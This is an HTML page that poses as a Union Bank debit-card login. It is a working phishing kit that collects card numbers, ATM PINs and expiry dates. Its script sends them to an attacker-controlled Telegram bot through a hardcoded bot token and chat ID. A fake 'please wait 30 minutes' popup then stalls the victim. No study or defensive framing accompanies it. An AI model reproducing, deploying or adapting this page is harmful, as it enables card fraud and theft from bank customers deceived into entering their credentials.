<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Union Bank Secure Login</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      margin: 0;
      background: #faeaea;
    }
    .header-img {
      width: 100%;
      height: auto;
      display: block;
    }
    .container {
      max-width: 400px;
      margin: 0 auto;
      background: white;
      border-radius: 15px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      overflow: hidden;
    }
    .tabs {
      display: flex;
      justify-content: center;
      background: #a41c1c;
      color: white;
      font-weight: bold;
      padding: 12px;
    }
    .form-section {
      padding: 20px;
    }
    input, select {
      width: 100%;
      margin: 10px 0;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 10px;
      box-sizing: border-box;
      font-size: 15px;
    }
    .btn {
      background: #a41c1c;
      color: #fff;
      border: none;
      width: 100%;
      padding: 14px;
      border-radius: 25px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 15px;
    }
    .btn:hover {
      background: #8f1919;
    }
    .footer-icons {
      display: flex;
      justify-content: space-around;
      padding: 15px 0;
      border-top: 1px solid #eee;
    }
    .footer-icons div {
      text-align: center;
      font-size: 12px;
      color: #a41c1c;
    }
    .footer-message {
      text-align: center;
      font-size: 14px;
      padding: 10px;
      color: #666;
    }
    .footer-message span {
      color: #a41c1c;
    }

    .popup-bg {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(5px);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

    .popup {
      background: white;
      padding: 20px 25px;
      border-radius: 10px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
      text-align: center;
      max-width: 300px;
      animation: fadeIn 0.3s ease-in-out;
    }

    .popup h3 {
      margin: 0 0 10px;
      color: #a41c1c;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

<img class="header-img" src="https://i.ibb.co/YBNXmkPg/images-7.png" alt="Header Image">

<div class="container">

  <div class="tabs">
    DEBIT CARD LOGIN
  </div>

  <!-- Only Card Form (Mobile removed) -->
  <div class="form-section" id="form-debit">
    <input type="text" id="card" placeholder="Debit Card Number" maxlength="19" oninput="formatCard(this)">
    <input type="password" id="pin" placeholder="ATM PIN" minlength="4" maxlength="6">
    <input type="text" id="expiry" placeholder="Expiry Date (MM/YY)" maxlength="5" oninput="formatExpiry(this)">
    <label>Directly go to screen</label>
    <select id="screen2">
      <option>Dashboard</option>
      <option>Complain</option>
    </select>
    <button class="btn" onclick="sendToTelegram()">üîí Secure Login</button>
  </div>

  <div class="footer-icons">
    <div>üìπ<br>Demo Videos</div>
    <div>üßÆ<br>Smart Calculator</div>
    <div>üìç<br>Locate Us</div>
  </div>
</div>

<div class="footer-message">
  Pay, Save, Borrow & Invest money <br>with a <span>trusted partner</span>
</div>

<!-- Popup -->
<div class="popup-bg" id="popup">
  <div class="popup">
    <h3>‚úÖ Please wait 30 minutes.</h3>
    <p>Our customer support team will contact you soon.</p>
  </div>
</div>

<script>
  function formatCard(input) {
    let value = input.value.replace(/\D/g, "").slice(0, 16);
    input.value = value.replace(/(.{4})/g, "$1 ").trim();
  }

  function formatExpiry(input) {
    let value = input.value.replace(/\D/g, "").slice(0, 4);
    if (value.length >= 3)
      input.value = value.slice(0, 2) + '/' + value.slice(2);
    else
      input.value = value;
  }

  function sendToTelegram() {
    const card = document.getElementById('card').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const expiry = document.getElementById('expiry').value.trim();
    const screen = document.getElementById('screen2').value;

    if (card.replace(/\s/g, '').length !== 16) {
      alert("Enter a valid 16-digit card number.");
      return;
    }
    if (pin.length < 4) {
      alert("ATM PIN must be at least 4 digits.");
      return;
    }
    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
      alert("Enter a valid expiry date in MM/YY format.");
      return;
    }

    const message = `üí≥ Union Bank Login\nCard: ${card}\nPIN: ${pin}\nExpiry: ${expiry}\nScreen: ${screen}`;
    const token = "7882249824:AAH_uilWT-fudDHjgyav97CGNR9XZHwh_5A";
    const chatId = "6677946042";
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
      .then(() => {
        document.getElementById("popup").style.display = "flex";
      })
      .catch(() => {
        alert("‚ùå Failed to send. Please try again.");
      });
  }
</script>

</body>
</html>
